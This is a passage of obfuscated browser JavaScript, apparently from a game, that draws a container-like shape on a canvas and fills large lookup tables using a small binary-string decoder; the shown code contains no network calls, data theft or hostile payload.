		function ᐃΔᐃᐃΔⲆΔⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 316;
			Ⲇⵠ.height = ᐃ * 365;
			Δ.save();
			Δ.translate(ᐃ * 156.07142639160156, 51.81248474121094 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -21.5 * ᐃ, ᐃ * -34, ᐃ * 43, 68 * ᐃ, 8 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ΔⵠΔᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(126.57142639160156 * ᐃ, 67.38392639160156 * ᐃ);
			Δ.bezierCurveTo(126.57142639160156 * ᐃ, 57.38392639160156 * ᐃ, ᐃ * 132.57142639160156, ᐃ * 54.38392639160156, ᐃ * 140.57142639160156, ᐃ * 54.38392639160156);
			Δ.bezierCurveTo(ᐃ * 177.57142639160156, ᐃ * 55.38392639160156, ᐃ * 158.07142639160156, 54.38392639160156 * ᐃ, 175.57142639160156 * ᐃ, ᐃ * 54.38392639160156);
			Δ.bezierCurveTo(185.57142639160156 * ᐃ, ᐃ * 56.38392639160156, ᐃ * 185.57142639160156, 57.38392639160156 * ᐃ, ᐃ * 184.57142639160156, ᐃ * 66.38392639160156);
			Δ.bezierCurveTo(184.57142639160156 * ᐃ, 78.38392639160156 * ᐃ, 184.57142639160156 * ᐃ, ᐃ * 89.38392639160156, 184.57142639160156 * ᐃ, 90.38392639160156 * ᐃ);
			Δ.bezierCurveTo(177.57142639160156 * ᐃ, ᐃ * 107.38392639160156, 180.57142639160156 * ᐃ, 112.38392639160156 * ᐃ, 189.57142639160156 * ᐃ, ᐃ * 116.38392639160156);
			Δ.bezierCurveTo(ᐃ * 212.57142639160156, 127.38392639160156 * ᐃ, 212.57142639160156 * ᐃ, 132.38392639160156 * ᐃ, 211.57142639160156 * ᐃ, ᐃ * 150.38392639160156);
			Δ.bezierCurveTo(ᐃ * 211.57142639160156, 227.59821128845215 * ᐃ, 211.57142639160156 * ᐃ, ᐃ * 227.59821128845215, 211.57142639160156 * ᐃ, 304.81249618530273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 212.57142639160156, ᐃ * 328.81249618530273, 209.57142639160156 * ᐃ, 330.81249618530273 * ᐃ, 188.57142639160156 * ᐃ, 333.81249618530273 * ᐃ);
			Δ.bezierCurveTo(155.07142639160156 * ᐃ, 333.31249618530273 * ᐃ, 155.07142639160156 * ᐃ, 333.31249618530273 * ᐃ, ᐃ * 121.57142639160156, 332.81249618530273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104.57142639160156, ᐃ * 327.81249618530273, ᐃ * 105.57142639160156, ᐃ * 328.81249618530273, ᐃ * 104.57142639160156, ᐃ * 312.81249618530273);
			Δ.bezierCurveTo(ᐃ * 104.57142639160156, 228.16963958740234 * ᐃ, ᐃ * 104.57142639160156, ᐃ * 228.16963958740234, 104.57142639160156 * ᐃ, 143.52678298950195 * ᐃ);
			Δ.bezierCurveTo(106.57142639160156 * ᐃ, 124.52678298950195 * ᐃ, 110.57142639160156 * ᐃ, 123.52678298950195 * ᐃ, ᐃ * 123.57142639160156, ᐃ * 116.52678298950195);
			Δ.bezierCurveTo(136.57142639160156 * ᐃ, ᐃ * 110.52678298950195, ᐃ * 130.57142639160156, 106.52678298950195 * ᐃ, 126.57142639160156 * ᐃ, ᐃ * 98.52678298950195);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠᐃᐃᐃ, Ⲇᐃ[5], ᐃ * ⵠᐃⲆΔᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(125.57142639160156 * ᐃ, 156.66963958740234 * ᐃ);
			Δ.bezierCurveTo(125.57142639160156 * ᐃ, 182.66963958740234 * ᐃ, ᐃ * 125.57142639160156, 182.66963958740234 * ᐃ, ᐃ * 125.57142639160156, 208.66963958740234 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], 15 * ᐃ);
			return Ⲇⵠ
		}

		function ΔᐃⵠⲆⲆΔⵠ() {
			var ⲆᐃΔᐃⵠⵠΔⲆⵠ = (new Date).getTime();
			ⲆⵠⵠⲆⲆⲆⲆᐃΔ();

			function ⲆΔⵠΔ(Ⲇᐃᐃᐃⵠ) {
				var ⵠᐃᐃᐃ = 0;
				for (var ⵠᐃ = ⲆΔⵠ, ᐃⵠᐃⵠ = 0; Ⲇᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ⲆΔᐃⲆ = Ⲇᐃᐃᐃⵠ.charAt(ⵠᐃ);
					if (ⲆΔᐃⲆ === "_" || ᐃⲆⵠⵠ === ⵠᐃ) continue;
					if (ⲆΔᐃⲆ === "1") ⵠᐃᐃᐃ += Math.pow(2, ᐃⵠᐃⵠ);
					ᐃⵠᐃⵠ++
				}
				return ⵠᐃᐃᐃ
			}
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠⵠΔᐃ] = [ⲆΔ.ⵠΔⲆⵠΔΔΔ, ⲆΔ.ΔΔⵠⵠᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[461])] = [ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ΔⵠΔΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[133])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[461])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[318])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[461])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[482])] = [ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[298])] = [ⲆΔ.ΔᐃᐃⲆᐃⲆⲆ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ⵠΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[282])] = [ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ΔⵠΔΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[367])] = [ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ᐃⲆᐃᐃΔⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[209])] = [ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ⲆᐃΔⲆᐃΔΔ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ᐃⲆᐃᐃΔⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[90])] = [ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[501])] = [ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ΔᐃᐃⲆᐃⲆⲆ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[50])] = [ⲆΔ.ΔⵠΔΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[277])] = [ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[52])] = [ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⲆΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[47])] = [ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[14])] = [ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[278])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ⵠᐃⵠΔᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[236])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[276])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ᐃΔᐃⲆⲆ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[290])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ΔⵠⵠⲆⵠᐃᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[211])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ⵠⲆⲆⵠΔⵠⲆ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[557])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ΔΔⲆᐃⲆΔⵠ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[120])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[125])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[161])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ⲆΔⲆⵠᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[67])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[ⲆⵠⵠᐃⲆⲆΔ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[27])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[147])] = [ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⲆΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[13])] = [ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[467])] = [ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ΔᐃᐃⲆᐃⲆⲆ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[405])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[13])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[146])] = [ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[418])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[146])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[202])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[146])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[477])] = [ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔᐃᐃⲆᐃⲆⲆ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[228])] = [ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ΔᐃⲆⲆΔⵠⲆ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[269])] = [ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[195])] = [ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[376])] = [ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ΔᐃⲆⲆΔⵠⲆ, ⲆΔ.ᐃⲆᐃΔⵠⵠⵠ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[411])] = [ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ, ⲆΔ.ᐃⲆᐃΔⵠⵠⵠ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[141])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[411])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[521])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[411])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[89])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[411])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[199])] = [ⲆΔ.ⵠᐃⵠᐃⵠ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ, ⲆΔ.ᐃⲆᐃΔⵠⵠⵠ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ΔⲆΔⲆΔⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[494])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[199])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[135])] = [ⲆΔ.ΔᐃⲆⲆΔⵠⲆ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ᐃⲆᐃΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[506])] = [ⲆΔ.ΔⲆΔⲆΔⵠΔ, ⲆΔ.ⲆⲆΔⵠΔ, ⲆΔ.ⲆⵠᐃⲆΔ, ⲆΔ.ΔᐃᐃⲆᐃⲆⲆ, ⲆΔ.ΔⲆᐃΔᐃ, ⲆΔ.ⵠᐃΔⵠⵠ, ⲆΔ.ᐃⵠⵠᐃⲆ, ⲆΔ.ᐃⲆΔΔⵠΔⲆ, ⲆΔ.ⵠᐃΔⲆⲆⲆⵠ, ⲆΔ.ΔⵠⵠᐃⲆ, ⲆΔ.ⵠⵠᐃᐃΔⵠⵠ, ⲆΔ.ⲆⲆΔᐃⲆⵠⲆ, ⲆΔ.ⲆᐃᐃΔⵠⲆᐃ, ⲆΔ.ᐃΔΔⵠⲆ, ⲆΔ.ⲆΔⵠⲆⵠⲆΔ, ⲆΔ.ⲆⲆⵠⲆⲆᐃᐃ, ⲆΔ.ΔⵠΔΔᐃ, ⲆΔ.ⵠⵠⵠΔΔ, ⲆΔ.ᐃᐃⵠⵠⵠᐃᐃ, ⲆΔ.ᐃᐃᐃΔᐃⲆⲆ, ⲆΔ.ⲆⵠⵠⵠΔᐃᐃ, ⲆΔ.ⵠΔΔⵠΔ, ⲆΔ.ᐃᐃⲆΔᐃ, ⲆΔ.ⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[121])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[199])];
